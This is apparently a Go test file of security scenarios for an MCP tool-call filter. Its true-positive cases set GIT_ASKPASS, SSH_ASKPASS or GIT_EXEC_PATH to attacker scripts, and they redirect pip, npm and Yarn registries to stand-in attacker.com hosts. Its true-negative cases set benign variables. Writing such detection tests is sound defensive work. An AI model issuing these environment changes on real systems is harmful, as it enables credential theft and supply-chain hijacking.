// Hand-curated MCP test scenarios for issues #2043 and #2044:
// Credential prompt hijack variables and package manager index redirect via env-setter.
//
// Rules covered:
//   mcp-privesc-block-git-credential-prompt-hijack         (BLOCK name=GIT_ASKPASS/SSH_ASKPASS/GIT_EXEC_PATH)
//   mcp-privesc-block-git-credential-prompt-hijack-key-arg (BLOCK key=... companion)
//   mcp-sc-audit-pkg-index-redirect-env-name               (AUDIT name=PIP_INDEX_URL/NPM_CONFIG_REGISTRY/...)
//   mcp-sc-audit-pkg-index-redirect-env-key                (AUDIT key=... companion)

package scenarios

var GitCredentialPromptPkgRedirectScenarios2043_2044 = []Scenario{
	// ── TP: GIT_ASKPASS via 'name' arg ──────────────────────────────────────────

	{
		ID:               "MCP-TP-2043-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_ASKPASS", "value": "/tmp/steal-creds.sh"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_ASKPASS set to /tmp script — redirects all Git HTTP credential prompts to attacker script",
	},
	{
		ID:               "MCP-TP-2043-002",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "GIT_ASKPASS", "value": "/home/attacker/hooks/askpass.sh"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_ASKPASS set to attacker home directory script — credential exfiltration on every git push/pull",
	},

	// ── TP: SSH_ASKPASS via 'name' arg ──────────────────────────────────────────

	{
		ID:               "MCP-TP-2043-003",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "SSH_ASKPASS", "value": "/tmp/passphrase-logger.py"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "SSH_ASKPASS set to Python logger — captures SSH key passphrases when ssh-add runs non-interactively",
	},
	{
		ID:               "MCP-TP-2043-004",
		ToolName:         "put_env",
		Arguments:        map[string]interface{}{"name": "SSH_ASKPASS", "value": "/tmp/log-passphrase.sh"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "SSH_ASKPASS set via put_env to /tmp exfil script — SSH passphrase interception in CI/agent workflow",
	},

	// ── TP: GIT_EXEC_PATH via 'name' arg ────────────────────────────────────────

	{
		ID:               "MCP-TP-2043-005",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "GIT_EXEC_PATH", "value": "/tmp/evil-git-cmds/"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_EXEC_PATH redirected to /tmp — replaces git-fetch/git-push subcommands with attacker binaries",
	},

	// ── TP: credential prompt hijack via 'key' arg ──────────────────────────────

	{
		ID:               "MCP-TP-2043-006",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "GIT_ASKPASS", "value": "/tmp/steal-creds.sh"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack-key-arg",
		Description:      "GIT_ASKPASS via 'key' arg — key-arg companion rule for frameworks using 'key' instead of 'name'",
	},
	{
		ID:               "MCP-TP-2043-007",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "SSH_ASKPASS", "value": "/tmp/passphrase-logger.py"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack-key-arg",
		Description:      "SSH_ASKPASS via 'key' arg — passphrase interceptor via key-arg convention",
	},
	{
		ID:               "MCP-TP-2043-008",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"key": "GIT_EXEC_PATH", "value": "/tmp/evil-git-cmds/"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack-key-arg",
		Description:      "GIT_EXEC_PATH via 'key' arg — subcommand hijack via key-arg convention",
	},

	// ── TN: benign Git env vars ──────────────────────────────────────────────────

	{
		ID:               "MCP-TN-2043-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_AUTHOR_NAME", "value": "Alice Developer"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_AUTHOR_NAME — legitimate Git author identity variable, not a credential interceptor",
	},
	{
		ID:               "MCP-TN-2043-002",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_COMMITTER_EMAIL", "value": "alice@example.com"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_COMMITTER_EMAIL — legitimate Git metadata, not a command interceptor",
	},
	{
		ID:               "MCP-TN-2043-003",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "GIT_EDITOR", "value": "vim"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_EDITOR set to vim — legitimate editor configuration, not a credential interceptor",
	},
	{
		ID:               "MCP-TN-2043-004",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"name": "GIT_TERMINAL_PROMPT", "value": "0"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack",
		Description:      "GIT_TERMINAL_PROMPT=0 — disables terminal prompts (common in CI), not credential interception",
	},
	{
		ID:               "MCP-TN-2043-005",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "GIT_AUTHOR_NAME", "value": "Bob"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack-key-arg",
		Description:      "GIT_AUTHOR_NAME via key arg — benign identity variable does not match credential interceptor rule",
	},
	{
		ID:               "MCP-TN-2043-006",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "GIT_EDITOR", "value": "vim"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-credential-prompt-hijack-key-arg",
		Description:      "GIT_EDITOR via key arg — legitimate editor config does not match hijack rule",
	},

	// ── TP: package manager index redirect via 'name' arg ───────────────────────

	{
		ID:               "MCP-TP-2044-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "PIP_INDEX_URL", "value": "http://evil-pypi.attacker.com/simple/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "PIP_INDEX_URL redirected to attacker PyPI mirror — all pip installs pulled from attacker server (supply chain hijack)",
	},
	{
		ID:               "MCP-TP-2044-002",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "PIP_EXTRA_INDEX_URL", "value": "https://attacker.com/pypi/simple/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "PIP_EXTRA_INDEX_URL set to attacker server — enables dependency confusion (pip uses highest-version package across all indexes)",
	},
	{
		ID:               "MCP-TP-2044-003",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "NPM_CONFIG_REGISTRY", "value": "http://attacker.com/npm/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "NPM_CONFIG_REGISTRY redirected to attacker npm mirror — all npm installs in session pulled from attacker",
	},
	{
		ID:               "MCP-TP-2044-004",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"name": "YARN_REGISTRY", "value": "https://evil-registry.attacker.com/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "YARN_REGISTRY (v1) redirected to attacker registry — Yarn package downloads hijacked for session",
	},
	{
		ID:               "MCP-TP-2044-005",
		ToolName:         "put_env",
		Arguments:        map[string]interface{}{"name": "YARN_NPM_REGISTRY_SERVER", "value": "http://evil.attacker.io/npm"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "YARN_NPM_REGISTRY_SERVER (Yarn v2/v3 Berry) redirected to attacker — session-wide package source hijack",
	},

	// ── TP: package manager index redirect via 'key' arg ────────────────────────

	{
		ID:               "MCP-TP-2044-006",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "PIP_INDEX_URL", "value": "http://evil-pypi.attacker.com/simple/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-key",
		Description:      "PIP_INDEX_URL via 'key' arg — supply chain redirect via key-arg convention",
	},
	{
		ID:               "MCP-TP-2044-007",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "NPM_CONFIG_REGISTRY", "value": "http://attacker.com/npm/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-key",
		Description:      "NPM_CONFIG_REGISTRY via 'key' arg — registry redirect via key-arg convention",
	},
	{
		ID:               "MCP-TP-2044-008",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"key": "YARN_REGISTRY", "value": "https://evil-registry.attacker.com/"},
		ExpectedDecision: "AUDIT",
		Classification:   "TP",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-key",
		Description:      "YARN_REGISTRY via 'key' arg — Yarn registry redirect via key-arg convention",
	},

	// ── TN: benign package-manager env vars ─────────────────────────────────────

	{
		ID:               "MCP-TN-2044-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "PIP_NO_CACHE_DIR", "value": "1"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "PIP_NO_CACHE_DIR — pip cache control flag, not an index redirect",
	},
	{
		ID:               "MCP-TN-2044-002",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "NPM_CONFIG_LOGLEVEL", "value": "warn"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "NPM_CONFIG_LOGLEVEL — npm log verbosity, not a registry redirect",
	},
	{
		ID:               "MCP-TN-2044-003",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "YARN_ENABLE_TELEMETRY", "value": "0"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "YARN_ENABLE_TELEMETRY — Yarn telemetry toggle, not a registry redirect",
	},
	{
		ID:               "MCP-TN-2044-004",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"name": "PORT", "value": "3000"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-name",
		Description:      "PORT — application port, not a package manager variable",
	},
	{
		ID:               "MCP-TN-2044-005",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "PIP_NO_CACHE_DIR", "value": "1"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-key",
		Description:      "PIP_NO_CACHE_DIR via key arg — benign pip cache flag, not a redirect",
	},
	{
		ID:               "MCP-TN-2044-006",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "NPM_CONFIG_LOGLEVEL", "value": "warn"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-sc-audit-pkg-index-redirect-env-key",
		Description:      "NPM_CONFIG_LOGLEVEL via key arg — log verbosity, not a registry redirect",
	},
}
